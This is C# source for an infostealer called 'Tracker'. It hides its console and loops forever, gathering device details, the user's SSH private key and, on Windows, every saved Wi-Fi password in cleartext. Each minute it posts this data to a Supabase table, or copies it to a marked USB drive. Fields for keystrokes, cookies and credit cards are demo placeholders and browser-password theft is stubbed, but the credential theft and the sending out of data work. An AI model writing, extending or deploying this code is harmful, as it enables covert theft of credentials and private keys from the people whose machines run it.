using System;
using System.IO;
using System.Threading;
using System.Net.Http;
using System.Runtime.InteropServices;
using Newtonsoft.Json;
using System.Diagnostics;
using System.Text.RegularExpressions;

namespace Tracker {
    class Program {
        // ============================================================
        // OS DETECTION
        // ============================================================
        static bool IsWindows => RuntimeInformation.IsOSPlatform(OSPlatform.Windows);
        static bool IsMacOS => RuntimeInformation.IsOSPlatform(OSPlatform.OSX);
        static bool IsLinux => RuntimeInformation.IsOSPlatform(OSPlatform.Linux);

        // ============================================================
        // SUPABASE CREDENTIALS (from environment variables)
        // ============================================================
        static string SUPABASE_URL = Environment.GetEnvironmentVariable("SUPABASE_URL") ?? "https://your-project.supabase.co";
        static string SUPABASE_KEY = Environment.GetEnvironmentVariable("SUPABASE_KEY") ?? "your-anon-key";
        static string TRACKER_ID = "TRK_" + Guid.NewGuid().ToString().Substring(0, 8).ToUpper();

        // Log file path (OS‑specific)
        static string logFile => IsWindows
            ? @"C:\Windows\System32\.tracker_log"
            : Path.Combine("/tmp", ".tracker_log");

        // ============================================================
        // STEALTH: Hide console (Windows only)
        // ============================================================
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        // ============================================================
        // MAIN ENTRY POINT
        // ============================================================
        static void Main() {
            // Hide console on Windows
            if (IsWindows) {
                var handle = GetConsoleWindow();
                ShowWindow(handle, 0);
            }
            // On macOS/Linux, no console to hide – already headless.

            // Main loop – runs forever
            while (true) {
                try {
                    string data = CollectAllData();

                    if (HasInternet()) {
                        SendToSupabase(data);
                        File.WriteAllText(logFile, "");
                    } else {
                        File.AppendAllText(logFile, data + "\n");
                    }

                    // USB exfiltration (Windows only – Node C detection)
                    if (IsNodeCPresent()) {
                        SendViaUSB(data);
                    }

                    Thread.Sleep(60000); // 60 seconds
                } catch (Exception ex) {
                    // Silent fail – log to debug file if needed
                    // File.AppendAllText(@"/tmp/.tracker_debug", $"[{DateTime.Now}] Error: {ex.Message}\n");
                }
            }
        }

        // ============================================================
        // COLLECT ALL DATA
        // ============================================================
        static string CollectAllData() {
            try {
                return JsonConvert.SerializeObject(new {
                    tracker_id = TRACKER_ID,
                    device_name = Environment.MachineName,
                    os = Environment.OSVersion.ToString(),
                    username = Environment.UserName,
                    ssid = GetWifiSSID(),
                    rssi = GetWifiRSSI(),
                    public_ip = GetPublicIP(),
                    latitude = "0.0",
                    longitude = "0.0",
                    altitude = "0.0",
                    magnitude = GetWifiRSSI(),
                    keystrokes = "(demo)",
                    screenshot = "(demo)",
                    saved_passwords = GetSavedPasswords(),
                    wifi_passwords = GetWiFiPasswords(),
                    browser_cookies = "(demo)",
                    ssh_keys = GetSSHKeys(),
                    browser_history = "(demo)",
                    clipboard_data = "(demo)",
                    emails = "(demo)",
                    credit_cards = "(demo)"
                });
            } catch (Exception ex) {
                // Fallback – return minimal data
                return JsonConvert.SerializeObject(new {
                    tracker_id = TRACKER_ID,
                    device_name = Environment.MachineName,
                    os = Environment.OSVersion.ToString(),
                    username = Environment.UserName,
                    error = ex.Message
                });
            }
        }

        // ============================================================
        // PLATFORM‑SPECIFIC IMPLEMENTATIONS
        // ============================================================

        // ---- Wi‑Fi SSID ----
        static string GetWifiSSID() {
            if (IsWindows) {
                try {
                    var p = new Process();
                    p.StartInfo.FileName = "netsh";
                    p.StartInfo.Arguments = "wlan show interfaces";
                    p.StartInfo.RedirectStandardOutput = true;
                    p.StartInfo.UseShellExecute = false;
                    p.StartInfo.CreateNoWindow = true;
                    p.Start();
                    string result = p.StandardOutput.ReadToEnd();
                    p.WaitForExit();
                    var match = Regex.Match(result, @"SSID\s*:\s*(.+)");
                    return match.Success ? match.Groups[1].Value.Trim() : "Unknown";
                } catch { return "Unknown"; }
            }
            if (IsMacOS) {
                try {
                    var p = new Process();
                    p.StartInfo.FileName = "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport";
                    p.StartInfo.Arguments = "-I";
                    p.StartInfo.RedirectStandardOutput = true;
                    p.StartInfo.UseShellExecute = false;
                    p.StartInfo.CreateNoWindow = true;
                    p.Start();
                    string result = p.StandardOutput.ReadToEnd();
                    p.WaitForExit();
                    var match = Regex.Match(result, @"SSID:\s*(.+)");
                    return match.Success ? match.Groups[1].Value.Trim() : "Unknown";
                } catch { return "Unknown"; }
            }
            if (IsLinux) {
                try {
                    var p = new Process();
                    p.StartInfo.FileName = "iwgetid";
                    p.StartInfo.Arguments = "-r";
                    p.StartInfo.RedirectStandardOutput = true;
                    p.StartInfo.UseShellExecute = false;
                    p.StartInfo.CreateNoWindow = true;
                    p.Start();
                    string result = p.StandardOutput.ReadToEnd().Trim();
                    return !string.IsNullOrEmpty(result) ? result : "Unknown";
                } catch { return "Unknown"; }
            }
            return "Unknown";
        }

        // ---- Wi‑Fi RSSI ----
        static int GetWifiRSSI() {
            if (IsWindows) {
                try {
                    var p = new Process();
                    p.StartInfo.FileName = "netsh";
                    p.StartInfo.Arguments = "wlan show interfaces";
                    p.StartInfo.RedirectStandardOutput = true;
                    p.StartInfo.UseShellExecute = false;
                    p.StartInfo.CreateNoWindow = true;
                    p.Start();
                    string result = p.StandardOutput.ReadToEnd();
                    p.WaitForExit();
                    var match = Regex.Match(result, @"Signal\s*:\s*(\d+)%");
                    if (match.Success) {
                        int rssi = int.Parse(match.Groups[1].Value);
                        return (rssi / 2) - 100;
                    }
                    return 0;
                } catch { return 0; }
            }
            if (IsMacOS) {
                try {
                    var p = new Process();
                    p.StartInfo.FileName = "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport";
                    p.StartInfo.Arguments = "-I";
                    p.StartInfo.RedirectStandardOutput = true;
                    p.StartInfo.UseShellExecute = false;
                    p.StartInfo.CreateNoWindow = true;
                    p.Start();
                    string result = p.StandardOutput.ReadToEnd();
                    p.WaitForExit();
                    var match = Regex.Match(result, @"agrCtlRSSI:\s*(-?\d+)");
                    return match.Success ? int.Parse(match.Groups[1].Value) : 0;
                } catch { return 0; }
            }
            // Linux: no standard way to get RSSI without tools; return 0.
            return 0;
        }

        // ---- Saved Passwords (placeholder – implement per platform) ----
        static string GetSavedPasswords() {
            // Windows: read from Chrome/Firefox SQLite + DPAPI
            // macOS: read from Keychain
            // Linux: read from GNOME Keyring / KWallet
            return "{}";
        }

        // ---- Wi‑Fi Passwords ----
        static string GetWiFiPasswords() {
            if (IsWindows) {
                try {
                    string output = "";
                    // Get all profiles
                    var p = new Process();
                    p.StartInfo.FileName = "netsh";
                    p.StartInfo.Arguments = "wlan show profiles";
                    p.StartInfo.RedirectStandardOutput = true;
                    p.StartInfo.UseShellExecute = false;
                    p.StartInfo.CreateNoWindow = true;
                    p.Start();
                    string result = p.StandardOutput.ReadToEnd();
                    p.WaitForExit();

                    var profileRegex = new Regex(@"All User Profile\s*:\s*(.*)");
                    foreach (Match match in profileRegex.Matches(result)) {
                        string profile = match.Groups[1].Value;
                        // Get password for this profile
                        var p2 = new Process();
                        p2.StartInfo.FileName = "netsh";
                        p2.StartInfo.Arguments = $"wlan show profile name=\"{profile}\" key=clear";
                        p2.StartInfo.RedirectStandardOutput = true;
                        p2.StartInfo.UseShellExecute = false;
                        p2.StartInfo.CreateNoWindow = true;
                        p2.Start();
                        string result2 = p2.StandardOutput.ReadToEnd();
                        p2.WaitForExit();

                        var keyRegex = new Regex(@"Key Content\s*:\s*(.*)");
                        foreach (Match keyMatch in keyRegex.Matches(result2)) {
                            output += $"{profile}:{keyMatch.Groups[1].Value}\n";
                        }
                    }
                    return output;
                } catch { return "ERROR"; }
            }
            if (IsMacOS) {
                // Use `security find-generic-password -wa <SSID>`
                // Complex – placeholder
                return "macOS Wi‑Fi passwords not implemented";
            }
            if (IsLinux) {
                // Read from /etc/NetworkManager/system-connections/
                return "Linux Wi‑Fi passwords not implemented";
            }
            return "ERROR";
        }

        // ---- SSH Keys ----
        static string GetSSHKeys() {
            try {
                string home = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                string sshPath = Path.Combine(home, ".ssh", "id_rsa");
                if (File.Exists(sshPath)) {
                    return File.ReadAllText(sshPath);
                }
                return "No SSH keys found";
            } catch { return "ERROR"; }
        }

        // ---- Public IP ----
        static string GetPublicIP() {
            try {
                using (var client = new HttpClient()) {
                    client.Timeout = TimeSpan.FromSeconds(5);
                    string response = client.GetStringAsync("https://api.ipify.org?format=json").Result;
                    var match = Regex.Match(response, @"""ip"":""([^""]+)""");
                    return match.Success ? match.Groups[1].Value : "Unknown";
                }
            } catch { return "Unknown"; }
        }

        // ---- Internet check ----
        static bool HasInternet() {
            try {
                using (var client = new HttpClient()) {
                    client.Timeout = TimeSpan.FromSeconds(5);
                    var response = client.GetAsync("https://supabase.co").Result;
                    return response.IsSuccessStatusCode;
                }
            } catch { return false; }
        }

        // ---- Send to Supabase ----
        static async void SendToSupabase(string data) {
            using (HttpClient client = new HttpClient()) {
                client.DefaultRequestHeaders.Add("apikey", SUPABASE_KEY);
                client.DefaultRequestHeaders.Add("Authorization", "Bearer " + SUPABASE_KEY);
                var content = new StringContent(data, System.Text.Encoding.UTF8, "application/json");
                await client.PostAsync(SUPABASE_URL + "/rest/v1/tracker_data", content);
            }
        }

        // ---- USB Exfiltration (Windows only – Node C detection) ----
        static bool IsNodeCPresent() {
            if (!IsWindows) return false;
            foreach (var drive in DriveInfo.GetDrives()) {
                if (drive.DriveType == DriveType.Removable && drive.IsReady) {
                    if (File.Exists(drive.Name + "nodec.txt")) return true;
                }
            }
            return false;
        }

        static void SendViaUSB(string data) {
            if (!IsWindows) return;
            foreach (var drive in DriveInfo.GetDrives()) {
                if (drive.DriveType == DriveType.Removable && drive.IsReady) {
                    File.WriteAllText(drive.Name + "tracker_data.json", data);
                }
            }
        }
    }
}
